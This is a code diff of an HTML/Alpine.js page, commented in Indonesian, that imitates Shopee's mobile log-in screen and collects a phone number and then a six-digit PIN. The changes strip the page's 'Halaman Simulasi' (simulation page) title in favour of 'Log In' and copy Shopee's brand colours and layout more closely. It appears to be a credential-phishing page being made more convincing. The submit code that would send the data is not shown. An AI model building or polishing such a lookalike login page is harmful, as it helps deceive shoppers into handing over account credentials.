@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Halaman Simulasi</title>
+    <title>Log In</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script defer src="https://cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js"></script>
     <script src="https://unpkg.com/lucide@latest"></script>
@@ -19,7 +19,10 @@
                     colors: {
                         shopee: {
                             main: '#ee4d2d',
-                            hover: '#d73e1f'
+                            hover: '#d73e1f',
+                            link: '#3a76cd', /* Warna biru link khas shopee */
+                            disabledBg: '#e6e6e6',
+                            disabledText: '#b3b3b3'
                         }
                     }
                 }
@@ -35,7 +38,7 @@
         * {
             -webkit-tap-highlight-color: transparent;
         }
-        
+
         /* Menghilangkan panah atas/bawah bawaan input type number/tel pada beberapa browser */
         input[type="tel"]::-webkit-outer-spin-button,
         input[type="tel"]::-webkit-inner-spin-button {
@@ -45,10 +48,10 @@
     </style>
 </head>
 
-<body class="bg-gray-100 flex justify-center items-center min-h-screen font-sans text-gray-800">
+<body class="bg-white sm:bg-gray-50 flex justify-center items-center min-h-screen font-sans text-gray-800">
 
     <div x-data="guestSimulation()" x-init="init()" x-cloak :aria-busy="isProcessing"
-        class="w-full max-w-[400px] bg-white min-h-screen sm:min-h-[800px] sm:rounded-xl shadow-lg relative overflow-hidden">
+        class="w-full max-w-[400px] bg-white min-h-screen sm:min-h-[800px] sm:shadow-lg relative overflow-hidden flex flex-col">
 
         <div x-show="isProcessing" x-transition.opacity.duration.300ms
             class="fixed inset-0 bg-white/95 z-[100] flex flex-col items-center justify-center" style="display: none;">
@@ -71,41 +74,44 @@
             </div>
         </div>
 
-        <form @submit.prevent="continueToPin">
-            <header class="flex items-center justify-between p-4 border-b border-gray-100">
-                <i @click="goBack" class="fa-solid fa-arrow-left text-shopee-main text-xl cursor-pointer"></i>
-                <h1 class="text-lg font-medium flex-1 ml-4 text-black">Log In</h1>
-                <i class="fa-regular fa-circle-question text-shopee-main text-xl cursor-pointer"></i>
+        <form @submit.prevent="continueToPin" class="flex-1 flex flex-col">
+            <header class="flex items-center justify-between p-4 bg-white">
+                <button type="button" @click="goBack" class="text-shopee-main text-2xl pr-4">
+                    <i class="fa-solid fa-arrow-left"></i>
+                </button>
+                <h1 class="text-xl font-bold flex-1 text-black">Log In</h1>
+                <button type="button" class="text-shopee-main text-xl pl-4">
+                    <i class="fa-regular fa-circle-question"></i>
+                </button>
             </header>
 
-            <main class="p-6">
-                <!-- LOGO MENGGUNAKAN IMAGE logo.png -->
-                <div class="flex justify-center mb-10">
-                    <img src="logo.png" alt="Logo" class="w-16 h-16 object-contain mt-3">
+            <main class="px-6 pt-4 flex-1">
+                <div class="flex justify-center mb-8">
+                    <img src="logo.png" alt="Logo" class="w-20 h-20 object-contain">
                 </div>
 
-                <!-- WRAPPER INPUT DIUBAH (Menambahkan focus-within:border-shopee-main dan animasi transisi) -->
-                <div class="flex items-center border-b-2 border-gray-300 focus-within:border-shopee-main transition-colors duration-300 py-3 mb-5">
-                    <!-- Icon ikut berubah warna (opsional, jika tidak ingin icon berubah, hapus focus-within:text-shopee-main) -->
-                    <i class="fa-solid fa-mobile-screen text-gray-400 focus-within:text-shopee-main text-xl mr-3 transition-colors duration-300"></i>
-                    <span class="text-gray-800 text-lg mr-2 font-medium">+62</span>
-                    <!-- Input dengan focus:outline-none dan focus:ring-0 untuk menghilangkan efek default browser -->
+                <div class="flex items-center border-b border-gray-300 focus-within:border-shopee-main transition-colors duration-300 py-2 mb-4">
+                    <i class="fa-solid fa-mobile-screen text-gray-600 text-lg mr-3"></i>
+                    <span class="text-black text-base mr-3 font-semibold">+62</span>
+                    <div class="h-5 w-[1px] bg-gray-300 mr-3"></div>
+                    
                     <input x-model="phone" @input="phone = sanitizePhone(phone)" type="tel" inputmode="tel"
-                        maxlength="32" class="flex-1 text-lg outline-none focus:outline-none focus:ring-0 text-gray-800 bg-transparent" 
-                        placeholder="Nomor Telepon">
+                        maxlength="32" class="flex-1 text-base outline-none focus:outline-none focus:ring-0 text-gray-800 bg-transparent placeholder-gray-500" 
+                        placeholder="No. Handphone">
                 </div>
 
                 <div x-show="error" role="alert"
                     class="rounded-md border border-red-200 bg-red-50 px-3 py-2 text-sm text-red-700 mb-4"
                     x-text="error"></div>
 
-                <button type="submit" :disabled="isProcessing"
-                    class="w-full bg-shopee-main text-white py-3 rounded text-lg mb-4 hover:bg-shopee-hover transition disabled:opacity-60">
+                <button type="submit" :disabled="phone.length < 4 || isProcessing"
+                    class="w-full py-3 rounded text-base font-medium mb-4 transition"
+                    :class="phone.length < 4 ? 'bg-shopee-disabledBg text-shopee-disabledText cursor-not-allowed' : 'bg-shopee-main text-white hover:bg-shopee-hover shadow-sm'">
                     Lanjut
                 </button>
 
-                <div class="text-right mb-6">
-                    <a href="#" class="text-blue-600 text-sm">Log in dengan Password</a>
+                <div class="text-right mb-8">
+                    <a href="#" class="text-shopee-link text-sm font-medium">Log in dengan Password</a>
                 </div>
 
                 <div class="flex items-center text-gray-400 text-xs mb-6">
@@ -115,30 +121,31 @@
                 </div>
 
                 <button type="button"
-                    class="w-full bg-white border border-gray-300 py-3 rounded text-sm mb-3 flex items-center justify-center space-x-2">
-                    <i class="fa-brands fa-google text-red-500 text-lg"></i>
-                    <span>Log In dengan Google</span>
+                    class="relative w-full bg-white border border-gray-300 py-3 rounded text-sm mb-3 flex items-center justify-center">
+                    <i class="fa-brands fa-google text-red-500 text-lg absolute left-4"></i>
+                    <span class="text-black font-medium">Log In dengan Google</span>
                 </button>
 
                 <button type="button"
-                    class="w-full bg-white border border-gray-300 py-3 rounded text-sm mb-3 flex items-center justify-center space-x-2">
-                    <i class="fa-brands fa-facebook text-blue-600 text-lg"></i>
-                    <span>Log In dengan Facebook</span>
+                    class="relative w-full bg-white border border-gray-300 py-3 rounded text-sm mb-3 flex items-center justify-center">
+                    <i class="fa-brands fa-facebook text-blue-600 text-lg absolute left-4"></i>
+                    <span class="text-black font-medium">Log In dengan Facebook</span>
                 </button>
 
                 <button type="button"
-                    class="w-full bg-white border border-gray-300 py-3 rounded text-sm mb-6 flex items-center justify-center space-x-2">
-                    <i class="fa-brands fa-whatsapp text-green-500 text-lg"></i>
-                    <span>Log In dengan WhatsApp</span>
+                    class="relative w-full bg-white border border-gray-300 py-3 rounded text-sm mb-10 flex items-center justify-center">
+                    <i class="fa-brands fa-whatsapp text-green-500 text-lg absolute left-4"></i>
+                    <span class="text-black font-medium">Log In dengan WhatsApp</span>
                 </button>
 
-                <div class="text-center text-sm border-b border-gray-200 pb-6 mb-4">
-                    Belum punya akun? <a href="#" class="text-blue-600">Daftar</a>
+                <div class="text-center text-sm mb-6">
+                    <span class="text-gray-800">Belum punya akun?</span> <a href="#" class="text-shopee-link font-medium">Daftar</a>
                 </div>
 
-                <div class="flex justify-between items-center text-sm text-gray-600">
-                    <div>
-                        <i class="fa-solid fa-fingerprint mr-2 text-lg"></i> Aktifkan Autentikasi Sidik Jari
+                <div class="border-t border-gray-200 pt-5 pb-8 flex justify-between items-center text-sm text-gray-600">
+                    <div class="flex items-center">
+                        <i class="fa-solid fa-fingerprint mr-2 text-lg text-gray-500"></i>
+                        <span class="text-gray-700">Aktifkan Autentikasi Sidik Jari</span>
                     </div>
 
                     <label class="relative inline-flex items-center cursor-pointer">
@@ -187,7 +194,7 @@
                 </div>
 
                 <div>
-                    <button type="button" @click="clearPin" class="text-blue-600 font-medium text-sm">Bersihkan</button>
+                    <button type="button" @click="clearPin" class="text-shopee-link font-medium text-sm">Bersihkan</button>
                 </div>
             </div>
 
@@ -261,7 +268,7 @@
                     this.guestModalMessage = '';
                 },
                 continueToPin() {
-                    this.error = ''; // Memperbaiki bug kecil 'error = ' pada script sebelumnya
+                    this.error = '';
 
                     if (!this.identifier || !/^[0-9+()\-\s]{6,32}$/.test(this.phone.trim())) {
                         this.showGuestError(this.guestErrorMessage);
@@ -278,7 +285,7 @@
                     this.showPinModal = false;
                     this.pin = '';
                 },
-                // FITUR GETAR (VIBRATION)
+                // FITUR GETAR (VIBRATION) TERTEKAN
                 vibrateDevice(ms = 40) {
                     if ('vibrate' in navigator) {
                         navigator.vibrate(ms);
@@ -287,7 +294,7 @@
                 addPin(number) {
                     if (this.isProcessing || this.pin.length >= 6) return;
                     
-                    this.vibrateDevice(40); // Getar saat input angka
+                    this.vibrateDevice(40);
                     this.pin += number;
 
                     if (this.pin.length === 6) {
@@ -297,11 +304,11 @@
                 removePin() {
                     if (this.isProcessing || this.pin.length === 0) return;
 
-                    this.vibrateDevice(60); // Getar sedikit lebih panjang saat menghapus
+                    this.vibrateDevice(60);
                     this.pin = this.pin.slice(0, -1);
                 },
                 clearPin() {
-                    this.vibrateDevice(80); // Getar saat membersihkan semua
+                    this.vibrateDevice(80);
                     this.pin = '';
                 },
                 async submitGuest() {
